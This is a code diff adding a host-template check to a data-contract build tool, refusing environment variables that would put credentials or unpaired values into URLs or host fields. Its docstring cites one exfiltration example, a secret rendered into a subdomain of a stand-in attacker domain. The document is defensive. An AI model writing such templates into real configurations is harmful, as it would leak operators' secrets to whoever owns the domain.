@@ -25,6 +25,16 @@ The rules, for every caller:
   ``main.tf.json``, to state, to a table COMMENT or to a catalog. It stays as
   written, with one warning per name, and is not "missing": policy refuses it.
 
+* On the acquisition path, a host is not the contract's to pick from the operator's
+  environment (:func:`check_host_templates`). A credential-shaped variable never
+  renders into a URL or a host field. Any other variable renders into a URL's
+  authority or a host field only when the operator pairs it with the host it
+  makes (``NAME@host`` in ``FLUID_ACQUISITION_SECRET_REF_ALLOWLIST``), unless it
+  *is* the host (``host: "{{ env.PGHOST }}"``): then the operator chose the
+  address and the contract only named the variable. Rendered into
+  ``https://{{ env.TOKEN }}.attacker.example`` a secret would be sent, in the host
+  name, to whoever owns the domain.
+
 Borrowed from the strict modes of ``envsubst -no-unset`` (collect every missing
 name, then fail), Docker Compose's ``${VAR:?}`` (unset or empty is an error) and
 Flux's ``--strict``; their "resolved later is always an explicit marker" is the
@@ -37,7 +47,7 @@ import logging
 import os
 import re
 from dataclasses import dataclass
-from typing import Any, Dict, List, Mapping, Optional
+from typing import Any, Dict, Iterable, List, Mapping, Optional
 
 from fluid_build._errors import FluidUserError, doc_url
 
@@ -238,6 +248,185 @@ def render_contract(
     return rendered_value
 
 
+#: Field names that hold a host, or a URL whose authority is one. The destination fields of
+#: ``secrets.policy`` plus the spellings connectors use.
+HOST_FIELD_NAMES = frozenset(
+    {
+        "host",
+        "hostname",
+        "uri",
+        "url",
+        "server",
+        "server_url",
+        "endpoint",
+        "instance_url",
+        "connection_string",
+        "sqlalchemy_url",
+    }
+)
+
+#: A value read as a URL: a scheme (or a placeholder for it) and ``://``.
+_URL_START = re.compile(r"\s*(?:[A-Za-z][\w+.\-]*|\{\{[^{}]*\}\})://")
+
+
+def _authority_end(text: str, start: int) -> int:
+    """Where the authority that begins at ``start`` ends: at the first ``/``, ``?`` or ``#``."""
+    ends = [i for i in (text.find(c, start) for c in "/?#") if i != -1]
+    return min(ends) if ends else len(text)
+
+
+def _hosts_of(authority: str) -> List[str]:
+    """Every host an authority (or a bare host field) names: userinfo and port dropped, a
+    comma list split, lower-cased. MongoDB and libpq take several and may use any of them."""
+    hosts: List[str] = []
+    for piece in authority.rpartition("@")[2].split(","):
+        piece = piece.strip()
+        if piece.startswith("["):
+            host = piece[1:].partition("]")[0]
+        else:
+            host = piece.partition(":")[0]
+        hosts.append(host.strip().lower().rstrip("."))
+    return hosts
+
+
+def _host_refusal(
+    name: str, where: str, *, credential: bool, stage: Optional[str]
+) -> EnvTemplateError:
+    """The refusal for one placeholder: its name and field, never a rendered value."""
+    if credential:
+        what = (
+            f"{{{{ env.{name} }}}} is a credential-shaped variable in the URL or host field {where}"
+        )
+        why = (
+            "A variable named like a credential never renders into a URL or a host: it would be "
+            "sent, in the address, to whichever host the contract names."
+        )
+        fix = (
+            "Give the credential to the connector as a secretRef, and write the host in the "
+            f"contract. If {name} is not a secret, rename it outside the "
+            "password/secret/token/key family."
+        )
+    else:
+        what = f"{{{{ env.{name} }}}} makes the host of {where}, and the operator has not paired it with that host"
+        why = (
+            "A variable renders into a host (or a URL's authority) only when the operator lists "
+            "it with the host it makes, so a contract cannot send a value from the operator's "
+            "environment to a host of its own choosing."
+        )
+        fix = (
+            f"Add {name}@<that host> to FLUID_ACQUISITION_SECRET_REF_ALLOWLIST in the operator "
+            "environment (the host is the one the value renders to), or write the host in the "
+            "contract."
+        )
+    return EnvTemplateError(
+        what=what,
+        where=where,
+        why=why + (f" ({stage})" if stage else ""),
+        fix=fix,
+        doc=doc_url(),
+        extras={
+            "variable": name,
+            "field": where,
+            "reason": "credential" if credential else "unpaired",
+        },
+        code="EnvTemplateHostError",
+    )
+
+
+_WHOLE_TEMPLATE = re.compile(r"\s*\{\{\s*env\.\S+?\s*\}\}\s*")
+
+
+def _pairing_names(authority: str) -> List[str]:
+    """The variables of ``authority`` (a URL's authority, or a host field) that the operator must
+    pair with the host: every one except a variable that is the whole host name.
+
+    ``user@{{ env.H }}:5432`` leaves ``H`` alone (the operator's variable makes the address; the
+    contract named only which one) but not a variable in the userinfo or the port, nor one with
+    text beside it (``{{ env.H }}.example``, ``db-{{ env.H }}``), nor a second variable.
+    """
+    userinfo, at, hostport = authority.rpartition("@")
+    port_at = hostport.rfind(":")
+    if port_at != -1 and hostport.find("]", port_at) == -1:
+        hostname, port = hostport[:port_at], hostport[port_at:]
+    else:
+        hostname, port = hostport, ""
+    names = [raw.strip() for raw in ENV_TEMPLATE_RE.findall(userinfo + port)]
+    if _WHOLE_TEMPLATE.fullmatch(hostname):
+        return names
+    return names + [raw.strip() for raw in ENV_TEMPLATE_RE.findall(hostname)]
+
+
+def check_host_templates(
+    value: Any,
+    *,
+    environ: Optional[Mapping[str, str]] = None,
+    stage: Optional[str] = None,
+    skip: Iterable[str] = (),
+) -> None:
+    """Refuse an ``{{ env.NAME }}`` that would put the operator's environment into an address.
+
+    Run on the contract as written, before :func:`render_contract` expands it, and
+    for a string that is a URL or sits in a host field (:data:`HOST_FIELD_NAMES`):
+
+    * a credential-shaped name (anywhere in that value) is refused;
+    * any other name in the URL's authority, or in a host field, is refused unless
+      the operator lists it with every host the value renders to
+      (:func:`fluid_build.secrets.policy.variable_allowed`, so a loopback host needs no
+      entry), or it is the whole host name: ``host: "{{ env.PGHOST }}"`` names which
+      variable holds the address, and the operator chose the address. A variable that
+      is unset is left to :func:`render_contract`, which says so.
+
+    Raises :class:`EnvTemplateError` naming the variable and the field, never the
+    rendered value. ``skip`` names top-level keys not to read (the contract's
+    ``builds``, when the build is checked beside it).
+    """
+    from fluid_build.observability.secret_redactor import is_sensitive_key_name
+    from fluid_build.secrets.policy import variable_allowed
+
+    env = os.environ if environ is None else environ
+    skipped = set(skip)
+
+    def check(text: str, where: str, key: str) -> None:
+        if "{{" not in text or ENV_TEMPLATE_RE.search(text) is None:
+            return
+        url = _URL_START.match(text)
+        if url is None and key.lower() not in HOST_FIELD_NAMES:
+            return
+        for raw in ENV_TEMPLATE_RE.findall(text):
+            name = raw.strip()
+            if is_sensitive_key_name(name):
+                raise _host_refusal(name, where, credential=True, stage=stage)
+        # The authority of a URL, or the whole of a host field: where a variable makes the host.
+        start = url.end() if url else 0
+        stop = _authority_end(text, start) if url else len(text)
+        authority = text[start:stop]
+        names = _pairing_names(authority)
+        if not names:
+            return
+        if any(not env.get(raw.strip()) for raw in ENV_TEMPLATE_RE.findall(authority)):
+            return  # render_contract reports the missing variable
+        rendered = ENV_TEMPLATE_RE.sub(lambda m: env[m.group(1).strip()], authority)
+        hosts = _hosts_of(rendered) or [""]
+        for name in names:
+            for host in hosts:
+                if not variable_allowed(name, host or None, environ=env):
+                    raise _host_refusal(name, where, credential=False, stage=stage)
+
+    def walk(node: Any, where: str, key: str) -> None:
+        if isinstance(node, str):
+            check(node, where, key)
+        elif isinstance(node, list):
+            for index, item in enumerate(node):
+                walk(item, f"{where}[{index}]", key)
+        elif isinstance(node, dict):
+            for field, item in node.items():
+                if not where and field in skipped:
+                    continue
+                walk(item, f"{where}.{field}" if where else str(field), str(field))
+
+    walk(value, "", "")
+
+
 def missing_fields(value: Any, environ: Optional[Mapping[str, str]] = None) -> Dict[str, List[str]]:
     """The variables ``value`` names that are unset or empty here, each with the fields that
     write it (``exposes[0].binding.location.bucket``), sorted by name.
@@ -271,11 +460,13 @@ def missing_fields(value: Any, environ: Optional[Mapping[str, str]] = None) -> D
 
 __all__ = [
     "ENV_TEMPLATE_RE",
+    "HOST_FIELD_NAMES",
     "EnvTemplateError",
     "SENSITIVE_REFUSE",
     "SENSITIVE_RENDER",
     "UNSET_DEFER",
     "UNSET_ERROR",
+    "check_host_templates",
     "missing_fields",
     "placeholder_names",
     "render_contract",
